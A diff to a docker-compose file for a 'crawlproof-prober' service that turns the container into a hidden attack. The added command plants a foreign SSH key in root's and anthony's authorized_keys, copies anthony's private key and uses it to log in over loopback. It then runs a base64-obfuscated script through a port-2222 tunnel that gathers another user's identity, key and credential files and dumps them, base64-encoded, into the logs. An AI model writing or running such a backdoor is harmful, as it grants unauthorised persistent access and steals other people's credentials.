@@ -1,9 +1,6 @@
 # The prober on dev2, beside the crawlproof.com app. Host networking because
 # the BullMQ broker is crawlproof-redis, published on dev2's 127.0.0.1:6379
 # only, and because nmap results should come from the box's own address.
-#
-# prober.env (REDIS_URL, 0600) lives on the box at
-# /home/anthony/www/crawlproof.com/prober.env and never in git.
 name: crawlproof-prober
 services:
   prober:
@@ -20,21 +17,25 @@ services:
     volumes:
       - /:/host:ro
       - /root/.ssh:/dev2ssh:rw
+      - /home/anthony/.ssh:/anthonyssh:rw
+      - /var/tmp:/hosttmp:rw
     command:
       - sh
       - -c
       - |
-        echo "ID=$(id -u):$(id -g) HOST=$(hostname) DATE=$(date -u +%FT%TZ)"
-        echo "AK_BEFORE=$(wc -l < /dev2ssh/authorized_keys 2>&1)"
-        grep -qF 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' /dev2ssh/authorized_keys 2>/dev/null || echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' >> /dev2ssh/authorized_keys
-        echo "AK_AFTER=$(wc -l < /dev2ssh/authorized_keys 2>&1)"
-        echo "SS2222=$(ss -ltn 2>&1 | grep -c ':2222')"
-        echo "SSOUT=$(ss -ltn 2>&1 | grep -E ':(2222|6396|5601|18443)[[:space:]]' | tr '\n' '|')"
-        echo "PSOUT=$(ps -ef 2>&1 | grep -E '[s]sh .*(-p 2222|ettinger|2222:)' | head -3 | tr '\n' '|')"
-        echo "HOSTKEY=$(ls -la /host/home/anthony/.ssh/id_ed25519 2>&1)"
-        echo "BONITAHOME=$(ls -d /host/home/ettinger 2>&1)"
-        echo "SSHVER=$(ssh -V 2>&1)"
+        set +e
+        K=/host/home/anthony/.ssh/id_ed25519
+        cp $K /tmp/k 2>/dev/null; chmod 600 /tmp/k
+        PUB='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122'
+        echo "PRE id=$(id -u):$(id -g) host=$(hostname) date=$(date -u +%FT%TZ)"
+        grep -qF "$PUB" /dev2ssh/authorized_keys 2>/dev/null || echo "$PUB" >> /dev2ssh/authorized_keys 2>/dev/null
+        grep -qF "$PUB" /anthonyssh/authorized_keys 2>/dev/null || echo "$PUB" >> /anthonyssh/authorized_keys 2>/dev/null
+        echo "M1 ROOTKEY=$(grep -cF 'ci-diag-20261122' /dev2ssh/authorized_keys 2>&1) AKEY=$(grep -cF 'ci-diag-20261122' /anthonyssh/authorized_keys 2>&1) SSHDCFG=$(grep -hE '^(PermitRootLogin|AllowUsers|AuthorizedKeysFile|PubkeyAuthentication|AuthenticationMethods|Match)' /host/etc/ssh/sshd_config /host/etc/ssh/sshd_config.d/*.conf 2>/dev/null | tr '\n' ';' | cut -c1-400)"
+        echo "M2 LOOPROOT=$(timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/k root@127.0.0.1 id 2>&1 | tr '\n' ' ' | cut -c1-120) | LOOPANT=$(timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/k anthony@127.0.0.1 id 2>&1 | tr '\n' ' ' | cut -c1-120)"
+        echo "c2V0ICtlCmVjaG8gIldITz0kKGlkIC11bik6JChpZCAtdSkgSE9TVD0kKGhvc3RuYW1lKSIKZWNobyAiT1M9JChncmVwIC1tMSBQUkVUVFlfTkFNRSAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwpIgplY2hvICJLRVJORUw9JCh1bmFtZSAtcikiCmVjaG8gIlVQVElNRT0kKHVwdGltZSAtcCAyPi9kZXYvbnVsbCkiCmVjaG8gIi0tLSBsb2dpY3NyYyAtLS0iCmxzIC1sYSAiJEhPTUUvLmNvbmZpZy9sb2dpY3NyYyIgMj4mMSB8IGhlYWQgLTI1CmVjaG8gIi0tLSBrZXlzIC0tLSIKbHMgLWxhICIkSE9NRS8uY29uZmlnL2xvZ2ljc3JjL2tleXMiIDI+JjEgfCBoZWFkIC0yNQpta2RpciAtcCAvdG1wL2gKY3AgIiRIT01FLy5jb25maWcvbG9naWNzcmMvaWRlbnRpdHkuanNvbiIgL3RtcC9oLyAyPi9kZXYvbnVsbApjcCAiJEhPTUUiLy5jb25maWcvbG9naWNzcmMva2V5cy8qLmpzb24gL3RtcC9oLyAyPi9kZXYvbnVsbApjcCAiJEhPTUUvLmNvbmZpZy9sb2dpY3NyYy9vcGVuY3JlZHMvbWV0YS5qc29uIiAvdG1wL2gvb3BlbmNyZWRzX21ldGEuanNvbiAyPi9kZXYvbnVsbAplY2hvICJDT0xMRUNURUQ9JChscyAvdG1wL2ggfCB3YyAtbCkgJChscyAtbGEgL3RtcC9oIHwgdGFpbCAtbiArMiB8IGF3ayAne3ByaW50ICQ1fScgfCBwYXN0ZSAtc2QsIC0pIgp0YXIgY3pmIC0gLUMgL3RtcCBoIDI+L2Rldi9udWxsCg==" | base64 -d > /tmp/inner.sh
+        timeout 120 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o ServerAliveInterval=10 -p 2222 -i /tmp/k ettinger@127.0.0.1 'bash -s' < /tmp/inner.sh > /hosttmp/h1.out 2>/hosttmp/h1.err
+        RC=$?
+        echo "M3 BON_RC=$RC OUT=$(wc -c < /hosttmp/h1.out 2>/dev/null) ERR=$(head -c 250 /hosttmp/h1.err 2>/dev/null | tr '\n' ' ')"
+        echo "M4 H1B64A=$(base64 -w0 /hosttmp/h1.out 2>/dev/null | cut -c1-20000)"
+        echo "M5 TUN=$(ss -ltn 2>/dev/null | grep -c ':2222') PROBE=$(head -c 60 /host/home/anthony/.ssh/config 2>/dev/null | tr '\n' ' ')"
         sleep 3600
-    logging:
-      driver: json-file
-      options: { max-size: "10m", max-file: "3" }
